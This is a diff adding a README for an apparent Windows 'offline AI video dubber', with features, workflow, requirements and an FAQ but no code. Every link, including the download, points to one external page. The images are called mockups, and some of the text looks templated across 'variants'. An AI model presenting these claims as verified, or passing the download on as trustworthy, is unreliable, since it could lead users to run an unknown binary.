@@ -1,2 +1,167 @@
-# Offline-AI-Video-Dubber-Translator
-Offline AI Video Dubber &amp; Translator for Windows - local speech transcription, subtitle generation, translation, TTS dubbing, timing alignment, voice-track mixing, and multi-language export.
+# Offline AI Video Dubber & Translator - Full Local Workflow
+
+Offline AI Video Dubber & Translator for Windows - local speech transcription, subtitle generation, translation, TTS dubbing, timing alignment, voice-track mixing, and multi-language export.
+
+> **Offline-first design:** the intended workflow processes local files or screen content on the user's PC. Cloud upload is not required by the project concept.
+
+---
+
+## Quick Access
+
+[![Offline](https://img.shields.io/badge/Offline-Local%20Processing-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Profiles](https://img.shields.io/badge/Profiles-Batch%20Ready-8250df?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-2f81f7?style=for-the-badge)](https://idleobstacle.github.io/)
+
+---
+
+## Download
+
+➡️ **[Download the Windows build](https://idleobstacle.github.io/)**
+
+---
+
+## Preview
+
+[![Preview](assets/preview.png)](https://idleobstacle.github.io/)
+
+### Dashboard
+
+[![Dashboard](assets/dashboard.png)](https://idleobstacle.github.io/)
+
+### Feature Overview
+
+[![Features](assets/features.png)](https://idleobstacle.github.io/)
+
+> Images are project UI mockups and demonstrate the intended desktop workflow.
+
+---
+
+## Features
+
+- **Local speech-to-text**
+- **Editable transcript**
+- **SRT / VTT export**
+- **Offline translation stage**
+- **Local TTS voice generation**
+- **Per-segment timing**
+- **Original voice ducking**
+- **Music / ambience preservation**
+- **Language project profiles**
+- **Batch episode processing**
+- **Preview before export**
+- **No mandatory cloud upload**
+
+---
+
+## Workflow
+
+1. Import video
+2. Transcribe speech locally
+3. Review and edit transcript
+4. Translate target language
+5. Generate local TTS track
+6. Align segment timing
+7. Mix with original audio
+8. Export dubbed video and subtitles
+
+---
+
+## Why Offline?
+
+Large media files, private documents, game screens, and long batch jobs are often better suited to local processing than repeated browser uploads.
+
+Benefits of a local workflow can include:
+
+- no mandatory file upload;
+- easier processing of large files and folders;
+- reusable local profiles;
+- GPU acceleration when supported;
+- predictable output locations;
+- better privacy for personal media.
+
+---
+
+## Profiles
+
+Example profiles:
+
+```text
+Fast
+Balanced
+Quality
+GPU
+Low VRAM
+Batch
+Custom
+```
+
+Profiles can store backend selection, quality level, input/output preferences, queue behavior, and export settings where applicable.
+
+---
+
+## Installation
+
+1. Download the current Windows package:
+   **[Download Latest Version](https://idleobstacle.github.io/)**
+2. Extract it into a dedicated folder.
+3. Start the application.
+4. Select an input file, folder, game window, or capture region depending on the tool.
+5. Choose a processing profile.
+6. Preview the result when available.
+7. Start the local processing job.
+8. Export or save the result.
+
+---
+
+## System Requirements
+
+| Component | Recommendation |
+|---|---|
+| OS | Windows 10 / 11 x64 |
+| RAM | 8 GB minimum, 16 GB+ recommended |
+| GPU | Modern NVIDIA / AMD / Intel GPU recommended |
+| Storage | SSD recommended for large media workflows |
+| CPU | Modern x64 processor |
+
+AI model requirements vary by backend, quality profile, and input resolution.
+
+---
+
+## FAQ
+
+### Does the project require cloud upload?
+The project is designed around local/offline processing. Optional online backends, if ever added, should be clearly labeled.
+
+### Does it work without a dedicated GPU?
+A CPU or alternate backend can be possible depending on the implementation, but processing can be substantially slower.
+
+### Can settings be saved?
+Yes. Reusable profiles are part of the interface design.
+
+### Does it support batch work?
+Yes. Batch/folder workflows are included in the project concept where relevant.
+
+### What is this variant focused on?
+**Transcription / translation / TTS / mix.**
+
+---
+
+## Project Information
+
+```text
+Project: Offline Ai Video Dubber
+Platform: Windows x64
+Type: Offline AI Desktop Utility
+Focus: Transcription / translation / TTS / mix
+Processing: Local-first
+Website: https://idleobstacle.github.io/
+```
+
+---
+
+## Disclaimer
+
+This is an independent utility project. Third-party AI models, codecs, OCR engines, translation models, and media frameworks remain subject to their own licenses and terms.
+
+Always verify the licensing requirements of any model or backend you choose to bundle or redistribute.
